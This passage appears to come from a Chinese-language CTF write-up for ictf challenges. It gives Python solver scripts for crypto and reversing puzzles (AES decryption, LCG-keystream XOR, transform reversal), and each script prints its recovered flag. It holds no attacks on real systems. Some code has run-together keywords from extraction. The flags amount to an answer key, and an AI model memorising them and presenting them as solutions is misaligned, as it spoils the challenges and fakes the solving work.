n=123523209115700070294981644790732507503241942394429660136286979085225539225766918094934084003208926365019794286807900970816082816805556312818180615326649781915503786367730476966518584795526802784277073173160764347448395548851236780509226531914660480359338947359987945086356147300832747042633158994277007963171
c=120556973610037647045631630603117690400204857398547796880632998178170164895802830966746983439988532372658807195415563963889101999001415501102869032382253975872835427817309277074087228787460070474098302761376812778112225868877978964444703058764270898908786813264849059600935509586945017063271188912710680388201
iv=0xb17c27e8915a32ed257f093a293f39ab
ct=0x0639466fc8d94dd2b3b5737f62148951c2c480cda262d2cf3465ab7bbd68381bff592878e9825f380d48743b2362d43f0d13bc679a1447c80c49f8dee09e3ff63b48ff423ac2d7c57fe930a75be69e71
key = sha256(str(m).encode()).digest()[:16]
aes=AES.new(key, AES.MODE_CBC, IV=long_to_bytes(iv))
print(aes.decrypt(long_to_bytes(ct)))
#ictf{p13cin9_7h3_b1t5_t0g37her_3f0068c1b9be2547ada52a8020420fb0}
```



```
outputs = [
"9548128459","491095","1014813","561097","10211614611201","5748108475",
"1171123","516484615","114959","649969946","1051160611501","991021",
"1231012101321","9912515","11411511","1151164611511"
]

def try_even_ascii(s):
    for ii in range(100):
        ii_str = str(ii)
        for l1 in range(1,4):
            for l2 in range(1,4):
                v1v3_len = l1 + l2
                if len(s) < v1v3_len + len(ii_str): continue
                v1v3 = s[:v1v3_len]; rest = s[v1v3_len:]
                ifnot rest.startswith(ii_str): continue
                tail = rest[len(ii_str):]
                if tail == v1v3[::-1]:
                    v1 = int(v1v3[:l1]); v3 = int(v1v3[l1:])
                    if32 <= v1 <= 126and32 <= v3 <= 126:
                        return ('even', v1, v3, ii)
    returnNone

def try_odd_ascii(s):
    for ii in range(100):
        ii_str = str(ii)
        ifnot s.endswith(ii_str): continue
        body = s[:-len(ii_str)]
        for l1 in range(1,4):
            if l1 >= len(body): break
            v1 = int(body[:l1]); v3 = int(body[l1:])
            if32 <= v1 <= 126and32 <= v3 <= 126:
                return ('odd', v1, v3, ii)
    returnNone

# 解析每一行（保持原顺序）
parsed = []
for o in outputs:
    r = try_even_ascii(o)
    if r isNone:
        r = try_odd_ascii(o)
    if r isNone:
        raise ValueError("无法解析输出行: " + o)
    parsed.append(r)

# 按两行一组恢复两个 tuple：A=(v1,v3,i1) 和 B=(v2,v4,i2)
tuples = {}
for p in range(len(parsed)//2):
    A = parsed[2*p]; B = parsed[2*p+1]
    _, a_x, a_y, i1 = A
    _, b_x, b_y, i2 = B
    tuples[i1] = (a_x, b_x)
    tuples[i2] = (a_y, b_y)

# 按索引 0..max 输出最终 flag
max_index = max(tuples.keys())
flag = "".join(chr(a)+chr(b) for i,(a,b) in sorted(tuples.items(), key=lambda x:x[0]))
print(flag)

ictf{cu3st0m_c0mp@r@t0rs_1e8f9e}
```



```
enc = bytes([
    0x28,0xF8,0x3E,0xE6,0x3E,0x2F,0x43,0x0C,
    0xB9,0x96,0xD1,0x5C,0xD6,0xBF,0x36,0xD8,
    0x20,0x79,0x0E,0x8E,0x52,0x21,0xB2,0x50,
    0xE3,0x98,0xB5,0xC9,0xB8,0xA0,0x88,0x30,
    0xD9,0x0A
])

seed = 322376503# main 中的参数

def keystream(seed, length):
    """模拟 keystream__nimrod_20"""
    n = seed
    ks = bytearray()
    for _ in range(length):
        n = (1664525 * n + 1013904223) & 0xFFFFFFFF# 32位溢出
        ks.append((n >> 16) & 0xFF)  # BYTE2
    return ks

def xor_decrypt(enc, seed):
    ks = keystream(seed, len(enc))
    return bytes([c ^ k for c, k in zip(enc, ks)])

plain = xor_decrypt(enc, seed)

# 打印可读明文
print("Decrypted:", ''.join(chr(x) if32 <= x <= 126else'.'for x in plain))

ictf{a_mighty_hunter_bfc16cce9dc8}
```



```
def reverseTransformFlag(transformed_flag):

    char_sets = [
        ("abcdefghijklmnopqrstuvwxyz", 26, lambda i, pos: (pos - i) % 26),
        ("0123456789", 10, lambda i, pos: next(c for c in range(10) if (i*2 + c) % 10 == pos)),
        ("!@#$%^&*()_+{}[]|", 17, lambda i, pos: next(c for c in range(17) if (i*i + c) % 17 == pos))
    ]
    
    result = []
    for i, char in enumerate(transformed_flag):
        for set_str, modulus, reverse_func in char_sets:
            if char in set_str:
                pos = set_str.index(char)
                try:
                    orig_pos = reverse_func(i, pos)
                    result.append(set_str[orig_pos])
                    break
                except StopIteration:
                    result.append(set_str[0])
        else:
            result.append(char)
    return''.join(result)

if __name__ == "__main__":
    transformed_string = "idvi+1{s6e3{)arg2zv[moqa905+"
    original_string = reverseTransformFlag(transformed_string)
    print(f"Transformed flag: {transformed_string}")
    print(f"Original flag: {original_string}")

ictf{1_l0v3_@ndr0id_stud103}
```



```
def reverse_off(x):

    return x - 15

def reverse_eor(x):

    return x ^ 0x69

def reverse_rtr(x):

    return ((x << 1) & 0xff) | (x >> 7)

def reverse_inc_output_to_input(next_flag):

    return next_flag
datas='94 7 d4 64 7 54 63 24 ad 98 45 72 35'
data1=0x94
data1=reverse_rtr(data1)
data1=reverse_eor(data1)
data1=reverse_off(data1)
print(chr(data1),end='')

data2=0x7
data2=reverse_eor(data2)
data2=reverse_eor(data2)
data2=reverse_eor(data2)
print(chr(data2),end='')

data2=0xd4
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x64
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x7
data2=reverse_eor(data2)
data2=reverse_eor(data2)
data2=reverse_eor(data2)
print(chr(data2),end='')

data2=0x54
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x63
data2=reverse_rtr(data2)
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x24
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0xad
data2=reverse_eor(data2)
data2=reverse_off(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x98
data2=reverse_rtr(data2)
data2=reverse_eor(data2)
data2=reverse_eor(data2)
print(chr(data2),end='')

data2=0x45
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_off(data2)
print(chr(data2),end='')

data2=0x72
data2=reverse_eor(data2)
data2=reverse_rtr(data2)
data2=reverse_rtr(data2)
print(chr(data2),end='')

data2=0x35
data2=reverse_rtr(data2)
data2=reverse_off(data2)
data2=reverse_eor(data2)
print(chr(data2))

icft{1n54n3_5k1ll2}
```



```
四个进程合作计算的结果：
35 0F EC D2 90 4E 8D 54 43 61 C2 EC 39 B1 58 D4 D6 CF 5D 94 E5 F5 D5 0C 85 E4 92 67 5A 31 47 51 07 67 D2 4E E4 0E D5 5B 9E 46 FE 83 23 09 0E A8 88 97 EF 9C 3B 74 DC EF 0B 21 6E 94 99 84 94 CF 22 19 51 BA 53 D5 C4 A0 C7 F5 5A 21 2D 94 78 E4 E2 9E 34 CC C5 C3 F2 67 13 2B 47 5B E3 12 E1 B4 D7 E1 A1 E1 66 94 30 5C 38 3E 2C 99 85 D7 2C 96 24 93 95 1D 6C 36 CB 4F 95 49 61 27 07 F2 12 15 82 5F A5 13 AA 84 26 16 F5 05 5E A9 8B 3D EE E3 80 33 AF BC 94 B1 BF D8 2A 4F B6 60 F0 73 24 A6 89 78 68 5F 2F 42 24 54 76 35 AC 35 A1 4E 5F 50 AB AD C0 F6 0D B6 81 66 B4 66 79 D8 8D 4C 31 45 F7 48 D3 5E BD AE 65 5F 12 C0 43 34 41 41 66 1C 1D 59 C5 59 BE 76 6B A6 87 13 31 43 93 91 B8 41 88 42 4E 79 1C E2 87 E1 50 01 EF C6 71 09 15 3D 91 8A 45 FB 2B DF D0 E9 AA B0 5C EC F0 C7 5C AB 38 DE 53 07 6B 50 18 F0 C1 BE EA 61 F6 AE 4D 33 63 C2 65 45 D0 E4 5E 2D 47 6D C8 6E 63 58 C8 D2 E9 4F 5F 03 0F D4 27 80 45 C0 10 67 A1 91 D1 B4 02 E5 28 85 78 39 E2 F6 D5 DD 8F E7 E4 0E 6D 6D 0C 29 B3 4F AC 11 86 20 80 49 3E 50 89 BE B7 BA D2 13 6B FD FB FC 22 80 88 60 9E A0 75 BA 4F E1 12 B9 DF 71 79 94 45 28 11 B2 2C 49 9C 1A 2F 21 DC D1 CE 8B 7C 1B 42 37 2F 6C 8E 80 79 11 90 3A 79 23 D7 22 6E CB FD 2E AC 58 A3 FB 26 89 CC B5 09 CD 6F B4 17 E0 37 FD 9F DC AC C7 9C F0 30 C4 CA BE 19 63 B8 C6 45 98 51 17 4A 26 CF 49 87 87 45 2D 72 31 C1 3F 38 8F 52 18 0D A1 BB 6C 99 B4 5E 61 CE C9 56 42 90 53 08 8E 28 8E 06 E6 44 77 70 E9 BA AF 58 25 F5 5D EC 31 AE DE 4C F6 45 DD 06 3F D6 08 B0 19 92 EC D6 6D AD 88 FF 6C 36 F5 BD 1B D3 C4 EF 77 55 0F D7 B2 9C 5A D3 15 E3 88 03 68 C3 EA 30 04 89 BA A5 66 33 D3 3A DA 77 26 A4 01 1E 4A A7 22 08 35 7F D8 3E 09 9C 50 C0 D6 6B B7 6B CF F2 24 38 5F 3D DC C8 A6 69 76 77 BC A6 44 39 FC 99 75 60 C7 FC D2 FF 4B D5 F3 50 F0 E1 72 76 82 35 E1 F4 B5 6C EF 0A 84 99 B5 73 EE 28 DB 1E 75 FF 31 6B 32 B2 A2 AC 33 44 AF 5A 54 55 33 89 4D 0B AC 32 AE CF 67 65 17 CB 87 B4 27 99 85 4B 48 E6 ED AD 43 3E 0D AD B5 EB B6 72 EF 60 75 6C A2 50 D1 FB D6 E7 8F 9C EA CD 04 C0 96 B8 42 11 D1 5E 6D C4 48 A9 A0 2C 76 0A 18 6A 9D 3C 89 EB 3F 09 1D C9 20 5C 94 BD 58 4B AC A1 37 21 61 B7 2E 7E B2 A9 56 31 89 4D 3B D0 E3 87 BF 9B A9 35 D4 76 2D A7 85 75 93 8C EF F6 61 5D C6 71 C4 1F 1E A9 63 20 DE 30 9C C8 B3 36 83 A9 85 5B 8D 08 80 EA E6 34 0E 28 F4 2C 51 04 3D C6 A4 30 14 33 88 3F 49 9A A6 14 95 08 FE C7 E0 B2 5A A1 ED 8D 3A 82 F5 73 DD 18 D6 DD 4F C2 D2 AA 35 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378104-wxsync-2025-09-b19c6df6ffc8d4226d4e3fb4b82b91b5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378105-wxsync-2025-09-7cd6414c9c43f8dcb53b11558da06d19.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378107-wxsync-2025-09-96ea7b877b10fb90a5bf2602bdcd4065.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378108-wxsync-2025-09-dcd61b0aa6e445410afa8d4acecbba08.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378110-wxsync-2025-09-6a8de2bc68a48fde6f5e5946b7a175c0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378112-wxsync-2025-09-b224068542b82d14d176b3656927cbdd.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378114-wxsync-2025-09-f2ed917e6d0abd81a0c0bcdaf39298e5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757378115-wxsync-2025-09-13b185911731e7abb2199e3ce4c1bc07.webp)